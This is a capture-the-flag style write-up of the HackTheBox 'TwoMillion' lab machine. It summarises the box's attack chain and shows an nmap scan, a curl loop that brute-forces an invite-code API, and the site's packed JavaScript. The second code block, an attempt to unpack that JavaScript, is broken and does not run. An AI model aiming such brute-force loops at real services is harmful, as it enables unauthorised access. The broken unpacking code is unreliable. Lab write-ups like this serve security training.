---
MOC: "[[HackTheBox Writeups]]"
tags:
  - "#writeup"
URL: https://app.hackthebox.com/machines/TwoMillion
Category: Linux
socialDescription: HackTheBox Two Million Writeup
socialImage: "[[TwoMillion.png]]"
---
-- --
# Challenge Description
> TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.
# Theory

# Solution
## Enumeration
```shell
sudo nmap -sC 10.10.11.221
```

```shell
sudo touch code.txt
for i in {111111..999999};
do
echo "$i: $(curl 'http://2million.htb/api/v1/invite/verify' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -b 'PHPSESSID=mj38hqaa5lhpcli02l88mp0uah' \
  --data-raw 'code=$i')" | sudo tee -a code.txt
done
```

The invite page loads `inviteapi.min.js`.

```javascript

eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    }
    ;
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }
        ];
        e = function() {
            return '\\w+'
        }
        ;
        c = 1
    }
    ;while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 
24, 
24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 
0, 
{}))

e = function(24) {
	return c.toString(36)
};
if (!''.replace(/^/, String)) {
	while (c--) {
		d[c.toString(a)] = k[c] || c.toString(a)
	}
	k = [function(e) {
		return d[e]
	}];
	e = function() {
		return '\\w+'
	};
	c = 1
};
while (c--) {
	if (k[c]) {
		p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
	}
}
return p
```